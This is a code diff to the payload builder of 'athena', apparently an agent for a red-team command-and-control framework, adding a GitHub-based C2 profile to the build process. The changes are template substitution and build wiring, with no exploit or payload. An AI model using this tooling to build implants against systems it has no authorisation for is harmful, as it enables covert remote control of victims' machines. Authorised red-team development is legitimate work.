@@ -144,7 +144,7 @@ class athena(PayloadType):
         #     description="Hide the window when running the payload"
         # ),
     ]
-    c2_profiles = ["http", "websocket", "slack", "smb", "discord"]
+    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
 
     async def prepareWinExe(self, output_path):
         pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
@@ -183,6 +183,21 @@ class athena(PayloadType):
         with open("{}/Agent.Profiles.Discord/DiscordProfile.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
         self.addProfile(agent_build_path, "Discord")
+
+    async def buildGitHub(self, agent_build_path, c2):
+        baseConfigFile = open("{}/Agent.Profiles.GitHub/Base.txt".format(agent_build_path.name), "r").read()
+        #baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
+        for key, val in c2.get_parameters_dict().items():
+            if key == "encrypted_exchange_check":
+                if val == "T":
+                    baseConfigFile = baseConfigFile.replace(key, "True")
+                else:
+                    baseConfigFile = baseConfigFile.replace(key, "False")  
+            else:
+                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
+        with open("{}/Agent.Profiles.GitHub/GitHubProfile.cs".format(agent_build_path.name), "w") as f:
+            f.write(baseConfigFile)
+        self.addProfile(agent_build_path, "GitHub")
 
     async def buildSMB(self, agent_build_path, c2):
         baseConfigFile = open("{}/Agent.Profiles.Smb/Base.txt".format(agent_build_path.name), "r").read()
@@ -404,6 +419,9 @@ class athena(PayloadType):
                 elif profile["name"] == "discord":
                     roots_replace += "<assembly fullname=\"Agent.Profiles.Discord\"/>" + '\n'
                     await self.buildDiscord(agent_build_path, c2)
+                elif profile["name"] == "github":
+                    roots_replace += "<assembly fullname=\"Agent.Profiles.GitHub\"/>" + '\n'
+                    await self.buildGitHub(agent_build_path, c2)
                 else:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
             
